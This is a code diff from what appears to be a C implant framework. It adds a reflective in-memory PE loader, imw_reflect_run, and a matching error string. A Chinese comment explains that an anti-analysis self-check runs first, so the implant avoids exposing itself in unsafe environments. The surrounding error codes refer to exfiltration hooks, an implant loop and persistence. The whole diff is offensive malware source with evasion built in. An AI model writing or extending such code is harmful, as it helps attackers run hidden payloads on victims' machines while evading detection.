@@ -176,6 +176,51 @@ int imw_bootstrap(const imw_cfg_t *cfg, const imw_hooks_t *h,
     return rc;
 }
 
+int imw_reflect_run(const imw_cfg_t *cfg, const imw_hooks_t *h,
+                    const rr_hooks_t *rh,
+                    const uint8_t *pe, size_t pe_len,
+                    uint8_t *region, size_t region_size,
+                    imw_result_t *out)
+{
+    rr_result_t rr;
+    int rc;
+
+    imw_result_init(out);
+
+    if (!cfg || !h) {
+        if (out) out->rc = IMW_ERR_PARAM;
+        return IMW_ERR_PARAM;
+    }
+
+    /*
+     * 对抗自检先于装载：装载会在目标机上产生权限切换与代码执行痕迹，
+     * 在不安全环境里做这一步，比什么都不做暴露得多。
+     */
+    rc = imw_selfcheck(h);
+    if (rc != IMW_OK) {
+        if (out) out->rc = rc;
+        return rc;
+    }
+
+    if (!pe || pe_len == 0 || !region || region_size == 0 || !rh) {
+        if (out) out->rc = IMW_ERR_PARAM;
+        return IMW_ERR_PARAM;
+    }
+
+    memset(&rr, 0, sizeof(rr));
+    rc = rr_load_run(pe, pe_len, region, region_size, rh, &rr);
+
+    if (out) {
+        out->reflect_rc    = rc;
+        out->n_reloc       = rr.n_reloc;
+        out->n_import      = rr.n_import;
+        out->n_tls         = (uint32_t)rr.n_tls;
+        out->entry_invoked = rr.entry_invoked;
+        out->rc            = (rc == RR_OK) ? IMW_OK : IMW_ERR_REFLECT;
+    }
+    return (rc == RR_OK) ? IMW_OK : IMW_ERR_REFLECT;
+}
+
 int imw_run(const imw_cfg_t *cfg, const imw_hooks_t *h, imw_result_t *out)
 {
     imw_result_init(out);
@@ -258,6 +303,7 @@ const char *imw_errstr(int rc)
     case IMW_ERR_NOEXFIL:  return "no exfil hook";
     case IMW_ERR_IMPLANT:  return "implant loop failed";
     case IMW_ERR_PERSIST:  return "persistence failed (strict)";
+    case IMW_ERR_REFLECT:  return "reflective load/run failed";
     default:               return "unknown";
     }
 }
